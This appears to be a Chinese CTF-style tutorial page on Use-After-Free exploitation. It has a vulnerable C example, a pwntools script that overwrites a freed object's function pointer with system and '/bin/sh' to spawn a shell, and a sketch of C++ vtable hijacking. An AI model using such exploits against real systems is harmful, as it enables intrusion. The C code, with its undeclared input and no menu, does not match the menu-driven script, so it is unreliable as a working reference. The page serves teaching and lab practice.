# UAF漏洞利用

Use-After-Free（UAF）漏洞发生在释放后的内存被再次使用时。

**漏洞代码：**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*print)(char *);
    char *name;
} Object;

void print_name(char *name) {
    printf("Name: %s\n", name);
}

void print_shell(char *name) {
    system("/bin/sh");
}

Object *create_object(char *name) {
    Object *obj = malloc(sizeof(Object));
    obj->print = print_name;
    obj->name = name;
    return obj;
}

int main() {
    Object *obj = create_object("hello");
    
    free(obj);             // 释放对象
    // obj成为悬挂指针
    
    // 分配相同大小的数据，可能复用obj的内存
    char *input = malloc(sizeof(Object));
    // 用户可以控制input的内容
    memcpy(input, user_input, sizeof(Object));
    
    // 通过悬挂指针调用函数
    obj->print(obj->name);  // UAF! 函数指针被覆盖
    // 如果用户将print覆盖为system，name覆盖为"/bin/sh"
    // 就相当于 system("/bin/sh")
    
    return 0;
}
```

**利用思路：**

```python
from pwn import *

context.arch = 'amd64'

p = process('./uaf_vuln')

# 泄露的地址
system_addr = 0x4005b0
binsh_addr = 0x4009c0

# 对象大小 = 8(函数指针) + 8(name指针) = 16
# 分配相同大小的chunk

p.sendlineafter(b'>', b'1')  # 创建对象
p.sendlineafter(b'>', b'2')  # 释放对象

# 分配相同大小的chunk，填充函数指针和name
payload = p64(system_addr) + p64(binsh_addr)
p.sendlineafter(b'>', b'3')  # 分配新数据
p.sendlineafter(b'data:', payload)

# 通过悬挂指针调用
p.sendlineafter(b'>', b'4')  # 调用obj->print(obj->name)
# 实际调用: system("/bin/sh")

p.interactive()
```

**C++虚函数表UAF：**

```cpp
class Base {
public:
    virtual void show() { printf("Base\n"); }
};

class Derived : public Base {
public:
    void show() override { printf("Derived\n"); }
};

// 利用：释放对象后用可控数据填充
// 将虚表指针覆盖为伪造的虚函数表
// 伪造虚表中show()指向shellcode
```

---

---

## 📋 内容审核与补充建议

> 针对「UAF漏洞利用」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### ⌨️ 命令帮助
- ⚠️ 缺少commands相关内容

### 📚 知识点补充
- ⚠️ 缺少knowledge相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
